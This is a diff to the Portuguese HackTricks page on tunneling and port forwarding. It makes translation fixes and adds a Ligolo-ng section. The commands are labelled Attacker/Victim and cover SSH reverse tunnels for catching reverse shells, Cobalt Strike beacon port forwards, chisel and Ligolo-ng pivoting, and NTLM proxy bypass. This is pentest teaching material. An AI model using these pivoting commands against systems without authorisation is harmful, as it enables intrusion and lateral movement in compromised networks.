@@ -74,7 +74,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 Isso é útil para obter shells reversos de hosts internos através de uma DMZ para o seu host:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
-# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
+# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
 # Note that port 443 must be open
 # Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
 # and change the line "GatewayPorts no" to "GatewayPorts yes"
@@ -159,7 +159,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-Neste caso, a **porta é aberta no host beacon**, não no Servidor da Equipe, e o tráfego é enviado para o Servidor da Equipe e, a partir daí, para o host:porta indicado.
+Neste caso, a **porta é aberta no host beacon**, não no Team Server, e o tráfego é enviado para o Team Server e, a partir daí, para o host:porta indicado.
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -167,9 +167,9 @@ rportfwd stop [bind port]
 ```
 Para notar:
 
-- O **reverso port forward do Beacon** é projetado para **túnel de tráfego para o Servidor da Equipe, não para retransmissão entre máquinas individuais**.
-- O tráfego é **tuneado dentro do tráfego C2 do Beacon**, incluindo links P2P.
-- **Privilégios de administrador não são necessários** para criar reversos port forwards em portas altas.
+- O **reverso de porta do Beacon** é projetado para **túnel de tráfego para o Servidor da Equipe, não para retransmissão entre máquinas individuais**.
+- O tráfego é **tunelado dentro do tráfego C2 do Beacon**, incluindo links P2P.
+- **Privilégios de administrador não são necessários** para criar reversos de porta em portas altas.
 
 ### rPort2Port local
 
@@ -202,10 +202,46 @@ Você precisa usar a **mesma versão para cliente e servidor**
 ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
-### Encaminhamento de porta
+### Encaminhamento de portas
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
+```
+## Ligolo-ng
+
+[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+
+**Use a mesma versão para agente e proxy**
+
+### Tunneling
+```bash
+# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
+sudo ./proxy -selfcert
+# Create an interface named "ligolo" -- Attacker
+interface_create --name "ligolo"
+# Print the currently used certificate fingerprint -- Attacker
+certificate_fingerprint
+# Start the agent with certification validation -- Victim
+./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
+# Select the agent -- Attacker
+session
+1
+# Start the tunnel on the proxy server -- Attacker
+tunnel_start --tun "ligolo"
+# Display the agent's network configuration -- Attacker
+ifconfig
+# Create a route to the agent's specified network -- Attacker
+interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
+# Display the tun interfaces -- Attacker
+interface_list
+```
+### Vinculação e Escuta do Agente
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
+listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+# Display the currently running listeners on the agent -- Attacker
+listener_list
 ```
 ## Rpivot
 
@@ -220,7 +256,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivotar através do **NTLM proxy**
+Fazer pivot através do **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -343,13 +379,13 @@ Agora você pode usar [**Proxifier**](https://www.proxifier.com/) **para fazer p
 ## Proxificar Aplicativos GUI do Windows
 
 Você pode fazer aplicativos GUI do Windows navegarem através de um proxy usando [**Proxifier**](https://www.proxifier.com/).\
-Em **Perfil -> Servidores Proxy** adicione o IP e a porta do servidor SOCKS.\
-Em **Perfil -> Regras de Proxificação** adicione o nome do programa a ser proxificado e as conexões para os IPs que você deseja proxificar.
+Em **Profile -> Proxy Servers** adicione o IP e a porta do servidor SOCKS.\
+Em **Profile -> Proxification Rules** adicione o nome do programa a ser proxificado e as conexões para os IPs que você deseja proxificar.
 
 ## Bypass de proxy NTLM
 
 A ferramenta mencionada anteriormente: **Rpivot**\
-**OpenVPN** também pode contorná-lo, definindo essas opções no arquivo de configuração:
+**OpenVPN** também pode contorná-lo, configurando estas opções no arquivo de configuração:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -529,7 +565,7 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 
 * Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 {% endhint %}
